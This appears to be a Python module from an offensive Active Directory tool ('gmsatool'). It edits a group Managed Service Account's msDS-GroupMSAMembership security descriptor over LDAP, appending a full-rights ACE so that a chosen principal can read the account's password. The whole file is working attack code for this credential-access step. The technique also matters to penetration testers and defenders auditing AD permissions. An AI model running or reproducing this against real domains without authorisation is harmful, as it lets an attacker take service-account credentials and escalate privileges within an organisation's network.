from ldap3.protocol.microsoft import security_descriptor_control
from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR

from gmsatool.protocols.ldap import get_entry, modify_attribute, samaccountname_to_sid
from gmsatool.helpers.common import logger, bcolors


class GMSAMembership:
    def __init__(self, domain, target, principal, ldap_session):
        self.domain = domain
        self.dn = ",".join([f"dc={i}" for i in self.domain.split(".")])
        self.target = target
        self.principal = principal
        self.ldap_session = ldap_session

    def add_readgmsapassword_access(self):
        attributes = ["distinguishedName", "msDS-GroupMSAMembership"]
        filter = f"(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={self.target}))"
        result = get_entry(self.ldap_session, self.dn, search_filter=filter, attributes=attributes, controls=security_descriptor_control(sdflags=0x07))
        target_dn = result[0]["attributes"]["distinguishedName"]
        current_sd = result[0]["attributes"]["msDS-GroupMSAMembership"]

        if current_sd:
            current_value = SECURITY_DESCRIPTOR.from_bytes(current_sd).to_sddl()
            new_value = current_value + f"(A;;0xf01ff;;;{samaccountname_to_sid(self.ldap_session, self.dn, self.principal)})"
        else:
            new_value = f"O:S-1-5-32-544D:(A;;0xf01ff;;;{samaccountname_to_sid(self.ldap_session, self.dn, self.principal)})"

        new_sd = SECURITY_DESCRIPTOR.from_sddl(new_value).to_bytes()
        modify_attribute(self.ldap_session, target_dn, "msDS-GroupMSAMembership", new_sd)
        logger.info(f"{bcolors.OKGREEN}[+] msDS-GroupMSAMembership successfully updated for {target_dn}{bcolors.ENDC}")
